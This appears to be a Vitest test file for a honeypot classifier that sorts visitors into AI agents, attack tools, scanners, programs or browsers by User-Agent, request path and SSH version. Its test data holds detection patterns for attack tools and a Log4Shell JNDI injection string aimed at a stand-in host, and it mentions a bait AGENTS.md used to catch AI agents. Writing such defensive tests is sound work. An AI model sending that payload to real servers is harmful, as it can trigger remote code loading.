import { describe, expect, it } from 'vitest';
import { quienEs } from './quien-es';

const de = (agente: string, ruta = '/login') => quienEs({ agente, ruta });

describe('quién hay al otro lado de un evento', () => {
	it('lo que dice el honeypot manda sobre el User-Agent', () => {
		expect(quienEs({ agente_ia: 'confirmed', agente: 'sqlmap/1.8' })).toMatchObject({
			clase: 'ia',
			nombre: 'AI agent'
		});
	});

	it.each([
		[
			'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot',
			'ia',
			'ChatGPT'
		],
		[
			'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)',
			'ia',
			'Anthropic ClaudeBot'
		],
		['Mozilla/5.0 (compatible; PerplexityBot/1.0)', 'ia', 'Perplexity'],
		['sqlmap/1.8.4#stable (https://sqlmap.org)', 'ataque', 'sqlmap'],
		[
			'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
			'ataque',
			'Nmap'
		],
		[
			'Mozilla/5.0 (Nuclei - Open-source project (github.com/projectdiscovery/nuclei))',
			'ataque',
			'Nuclei'
		],
		['Fuzz Faster U Fool v2.1.0', 'ataque', 'ffuf'],
		['${jndi:ldap://x.example/a}', 'ataque', 'Exploit in the User-Agent'],
		['Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'barrido', 'Censys'],
		[
			'Expanse, a Palo Alto Networks company, searches across the global IPv4 space',
			'barrido',
			'Palo Alto Xpanse'
		],
		['curl/8.7.1', 'programa', 'curl'],
		['python-requests/2.32.3', 'programa', 'Python requests'],
		['Go-http-client/1.1', 'programa', 'Go'],
		[
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0 Safari/537.36',
			'programa',
			'Automated browser'
		],
		[
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36',
			'navegador',
			'Browser'
		]
	] as const)('%s → %s (%s)', (ua, clase, nombre) => {
		expect(de(ua)).toMatchObject({ clase, nombre });
	});

	it('el User-Agent también llega como user_agent', () => {
		expect(quienEs({ user_agent: 'nikto/2.5.0' })).toMatchObject({
			clase: 'ataque',
			nombre: 'Nikto'
		});
	});

	it('una ruta que solo busca una IA delata aunque el User-Agent sea de navegador', () => {
		const navegador =
			'Mozilla/5.0 (Macintosh) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15';
		expect(de(navegador, '/llms.txt')).toMatchObject({ clase: 'ia', nombre: 'AI agent?' });
		expect(de('', '/.well-known/ai-plugin.json?x=1')).toMatchObject({ clase: 'ia' });
		expect(de(navegador, '/mcp')).toMatchObject({ clase: 'ia' });
		expect(de(navegador, '/mcpanel')?.clase).toBe('navegador');
	});

	it('quien pide la dirección del AGENTS.md cebo es un agente de IA', () => {
		expect(quienEs({ ua: 'curl/8.7.1', path: '/b/abc123/agent-check' })).toMatchObject({
			clase: 'ia',
			nombre: 'AI agent?'
		});
		expect(quienEs({ ua: 'curl/8.7.1', path: '/b/abc123' })).toMatchObject({ clase: 'programa' });
	});

	it('por SSH, el cliente que anuncia', () => {
		expect(quienEs({ version: 'SSH-2.0-paramiko_3.4.0' })).toMatchObject({
			clase: 'programa',
			nombre: 'Python Paramiko'
		});
		expect(quienEs({ version: 'SSH-2.0-Go' })).toMatchObject({ nombre: 'Go' });
		expect(quienEs({ version: 'SSH-2.0-OpenSSH_9.6' })).toMatchObject({ clase: 'navegador' });
		expect(quienEs({ version: 'SSH-2.0-desconocido' })).toBeNull();
		/* Un número de versión de otra cosa no es un cliente SSH. */
		expect(quienEs({ version: '1.2.3' })).toBeNull();
	});

	it('sin nada reconocible, no dice nada', () => {
		expect(quienEs({})).toBeNull();
		expect(quienEs(null)).toBeNull();
		expect(de('algo-que-nadie-conoce/1.0')).toBeNull();
		expect(quienEs({ agente: 42 })).toBeNull();
	});

	it('el motivo no arrastra un User-Agent enorme', () => {
		expect(de('curl/' + 'x'.repeat(5000))!.motivo.length).toBeLessThan(260);
	});
});
